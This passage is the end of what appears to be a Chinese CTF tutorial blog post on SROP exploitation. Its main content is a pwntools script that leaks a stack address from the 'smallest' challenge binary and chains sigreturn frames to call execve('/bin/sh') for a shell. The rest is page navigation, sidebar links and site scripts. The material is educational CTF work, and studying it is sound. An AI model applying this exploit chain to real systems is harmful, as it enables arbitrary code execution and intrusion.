class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">small = ELF(<span class="string">&#x27;./smallest&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./smallest&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">syscall_ret = <span class="number">0x00000000004000BE</span> <span class="comment">#源代码syscall处地址</span></span><br><span class="line">start_addr = <span class="number">0x00000000004000B0</span>  <span class="comment">#源代码xor rax,rax处地址</span></span><br><span class="line"></span><br><span class="line">payload = p64(start_addr) * <span class="number">3</span>  <span class="comment">#部署三个start_addr，完成三次read函数的调用</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#覆盖第二个start_addr的最后一个字节变成0x00000000004000B3，越过对rax寄存器的清零，还使得rax寄存器值变为1</span></span><br><span class="line">sh.send(<span class="string">&#x27;\xb3&#x27;</span>)  </span><br><span class="line">stack_addr = u64(sh.recv()[<span class="number">8</span>:<span class="number">16</span>]) <span class="comment">#接收接下要要部署的栈顶地址</span></span><br><span class="line">log.success(<span class="string">&#x27;leak stack addr :&#x27;</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">read = SigreturnFrame()</span><br><span class="line">read.rax = constants.SYS_read <span class="comment">#read函数系统调用号</span></span><br><span class="line">read.rdi = <span class="number">0</span>  <span class="comment">#read函数一参</span></span><br><span class="line">read.rsi = stack_addr  <span class="comment">#read函数二参</span></span><br><span class="line">read.rdx = <span class="number">0x400</span>  <span class="comment">#read函数三参</span></span><br><span class="line">read.rsp = stack_addr  <span class="comment">#和rsi寄存器中的值保持一致，确保read函数写的时候rsp指向stack_addr</span></span><br><span class="line">read.rip = syscall_ret <span class="comment">#使得rip指向syscall的位置，在部署好read函数之后能直接调用</span></span><br><span class="line">payload = p64(start_addr) + p64(syscall_ret) + <span class="built_in">str</span>(read)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.send(payload[<span class="number">8</span>:<span class="number">8</span>+<span class="number">15</span>])  <span class="comment">#输入15个字节使得rax寄存器的值为15，进行sigreturn调用</span></span><br><span class="line"></span><br><span class="line">execve = SigreturnFrame()</span><br><span class="line">execve.rax = constants.SYS_execve</span><br><span class="line"><span class="comment"># &quot;/bin/sh&quot;字符串地址，这里为了能够让exp3.1正常执行，所以直接给了0x120，下面会将为什么是0x120</span></span><br><span class="line">execve.rdi = stack_addr + <span class="number">0x120</span>  </span><br><span class="line">execve.rsi = <span class="number">0x0</span> <span class="comment">#execve函数二参</span></span><br><span class="line">execve.rdx = <span class="number">0x0</span> <span class="comment">#execve函数二参</span></span><br><span class="line">execve.rsp = stack_addr </span><br><span class="line">execve.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">frame_payload = p64(start_addr) + p64(syscall_ret) + <span class="built_in">str</span>(execve)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(frame_payload)</span><br><span class="line"><span class="comment"># 将execve函数调用和/bin/sh字符串一起部署到栈中</span></span><br><span class="line">payload = frame_payload + (<span class="number">0x120</span> - <span class="built_in">len</span>(frame_payload)) * <span class="string">&#x27;\x00&#x27;</span> + <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.send(payload[<span class="number">8</span>:<span class="number">8</span>+<span class="number">15</span>])</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://elydemiurge.github.io">Cyberangel</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-10%EF%BC%89-%E9%AB%98%E7%BA%A7ROP-SROP/">https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-10%EF%BC%89-%E9%AB%98%E7%BA%A7ROP-SROP/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://elydemiurge.github.io" target="_blank">Cyberangel's Blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="https://picsum.photos/seed/blog-cover-05/800/450" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/Linux/Linux%2032%E4%BD%8D%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%8F%B7/" title="Linux 32位系统调用号"><img class="cover" src="https://picsum.photos/seed/blog-cover-01/800/450" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Linux 32位系统调用号</div></div><div class="info-2"><div class="info-item-1">Linux 32位系统调用号 来自:https://blog.csdn.net/qq_41202237&#x2F;article&#x2F;details&#x2F;107249667     系统调用 调用号 系统调用 调用号    exit 1 fork 2   read 3 write 4   open 5 close 6   waitpid 7 creat 8   link 9 unlink 10   execve 11 chdir 12   time 13 mknod 14   chmod 15 lchown 16   break 17 oldstat 18   lseek 19 getpid 20   mount 21 umount 22   setuid 23 getuid 24   stime 25 ptrace 26   alarm 27 oldfstat 28   pause 29 utime 30   stty 31 gtty 32   access 33 nice 34   ftime 35 sync 36   kill 37 rename 38   mk...</div></div></div></a><a class="pagination-related" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%882-1-6%EF%BC%89-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E-hijack%20GOT/" title="PWN入门（2-1-6）-格式化字符串漏洞-hijack GOT"><img class="cover" src="https://picsum.photos/seed/blog-cover-03/800/450" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">PWN入门（2-1-6）-格式化字符串漏洞-hijack GOT</div></div><div class="info-2"><div class="info-item-1">PWN入门（2-1-6）-格式化字符串漏洞-hijack GOT 附件：链接：https://pan.baidu.com/s/1H9AVH4wXct8gxkf9GV0YWA提取码：140h例题：2016-CCTF-pwn3  原理现在的C程序中，libc的函数是通过GOT表来实现跳转的。在没有开启RELRO（或开启Partial RELRO）保护的前提下，每个libc的函数对应的GOT表项是可以被修改的。因此修改某个libc函数的GOT表内容为另一个libc函数的地址来实现对程序的控制。 假设我们将函数A的地址覆盖为函数B的地址，那么这一攻击技巧可以分为以下步骤  确定函数A的GOT表地址  主要利用函数A一般在程序中已有，所以可以采用简单的寻找地址的方法来找  确定函数B的内存地址  需要想办法泄露对应函数B的地址  将函数B的内存写入到函数A的GOT表地址处  需要利用函数的漏洞来触发  写入函数：write函数- ROP  pop eax; ret; # printf@got -&gt; eax   - pop ebx; ret; # (addr_offset = syst...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Cyberangel</div><div class="author-info-description">二进制安全</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">467</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ElyDemiurge"><i class="fab fa-github"></i><span>GitHub</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/ElyDemiurge" target="_blank" title="GitHub"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:elydemiurge@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">从语雀迁移博客到 Github</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-10%EF%BC%89-%E9%AB%98%E7%BA%A7ROP-SROP"><span class="toc-number">1.</span> <span class="toc-text">PWN入门（1-3-10）-高级ROP-SROP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#signal%E6%9C%BA%E5%88%B6"><span class="toc-number">1.1.</span> <span class="toc-text">signal机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">攻击原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96shell"><span class="toc-number">1.2.1.</span> <span class="toc-text">获取shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#system-call-chains"><span class="toc-number">1.2.2.</span> <span class="toc-text">system call chains</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E7%BB%AD"><span class="toc-number">1.2.3.</span> <span class="toc-text">后续</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">1.2.4.</span> <span class="toc-text">利用工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%83%85%E5%86%B5"><span class="toc-number">1.3.</span> <span class="toc-text">使用情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.4.</span> <span class="toc-text">示例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95"><span class="toc-number">1.5.</span> <span class="toc-text">第一次尝试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%B0%9D%E8%AF%95"><span class="toc-number">1.6.</span> <span class="toc-text">第二次尝试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E4%BD%93%E6%80%9D%E8%B7%AF"><span class="toc-number">1.7.</span> <span class="toc-text">总体思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6write%E5%87%BD%E6%95%B0%E6%89%93%E5%8D%B0%E6%A0%88%E5%9C%B0%E5%9D%80"><span class="toc-number">1.7.1.</span> <span class="toc-text">控制write函数打印栈地址</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8sigreturn%E5%AF%B9read%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%9A%84%E5%AF%84%E5%AD%98%E5%99%A8%E8%BF%9B%E8%A1%8C%E9%83%A8%E7%BD%B2"><span class="toc-number">1.7.1.1.</span> <span class="toc-text">使用sigreturn对read函数调用的寄存器进行部署</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8sigreturn%E5%AF%B9execve%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%9A%84%E5%AF%84%E5%AD%98%E5%99%A8%E8%BF%9B%E8%A1%8C%E9%83%A8%E7%BD%B2"><span class="toc-number">1.7.1.2.</span> <span class="toc-text">使用sigreturn对execve函数调用的寄存器进行部署</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(11)--IoT%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83docker%E5%B0%81%E8%A3%85%E6%8C%87%E5%8D%97/" title="《IoT从入门到入土》(11)--IoT靶场环境docker封装指南"><img src="https://picsum.photos/seed/blog-cover-06/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(11)--IoT靶场环境docker封装指南"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(11)--IoT%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83docker%E5%B0%81%E8%A3%85%E6%8C%87%E5%8D%97/" title="《IoT从入门到入土》(11)--IoT靶场环境docker封装指南">《IoT从入门到入土》(11)--IoT靶场环境docker封装指南</a><time datetime="2022-12-08T00:19:26.000Z" title="发表于 2022-12-08 08:19:26">2022-12-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-2)--Zyxel-NAS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ARM32--Hijack%20GOT%E3%80%81UDP%EF%BC%89/" title="《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）"><img src="https://picsum.photos/seed/blog-cover-07/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-2)--Zyxel-NAS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ARM32--Hijack%20GOT%E3%80%81UDP%EF%BC%89/" title="《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）">《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）</a><time datetime="2022-11-25T01:47:22.000Z" title="发表于 2022-11-25 09:47:22">2022-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-1)--Zyxel-NAS%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建"><img src="https://picsum.photos/seed/blog-cover-08/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-1)--Zyxel-NAS%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建">《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建</a><time datetime="2022-11-21T02:38:00.000Z" title="发表于 2022-11-21 10:38:00">2022-11-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(9)--TOTOLINK_NR1800X%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8Alighttpd%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%B5%85%E6%9E%90/" title="《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析"><img src="https://picsum.photos/seed/blog-cover-01/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(9)--TOTOLINK_NR1800X%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8Alighttpd%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%B5%85%E6%9E%90/" title="《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析">《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析</a><time datetime="2022-11-10T05:43:27.000Z" title="发表于 2022-11-10 13:43:27">2022-11-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/Reverse/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%95%B4%E7%90%86%EF%BC%882020%E5%B9%B42%E6%9C%8823%E6%97%A5notability%E6%89%8B%E5%86%99%E7%AC%94%E8%AE%B0%EF%BC%89/" title="PE文件格式整理（2020年2月23日notability手写笔记）"><img src="https://picsum.photos/seed/blog-cover-02/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PE文件格式整理（2020年2月23日notability手写笔记）"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/Reverse/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%95%B4%E7%90%86%EF%BC%882020%E5%B9%B42%E6%9C%8823%E6%97%A5notability%E6%89%8B%E5%86%99%E7%AC%94%E8%AE%B0%EF%BC%89/" title="PE文件格式整理（2020年2月23日notability手写笔记）">PE文件格式整理（2020年2月23日notability手写笔记）</a><time datetime="2022-11-08T01:10:26.000Z" title="发表于 2022-11-08 09:10:26">2022-11-08</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2019 - 2026 By Cyberangel</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.5"></script><script src="/js/main.js?v=5.5.5"></script><div class="js-pjax"></div><script src="/js/decode-copyright-url.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js" defer="defer"></script><script>document.addEventListener('DOMContentLoaded', () => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => {
+      try {
+        fn()
+      } catch (err) {
+        console.debug('Pjax callback failed:', err)
+      }
+    })
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      true
+        ? pjax.loadUrl('/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})</script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.5"></script></div></div></body></html>
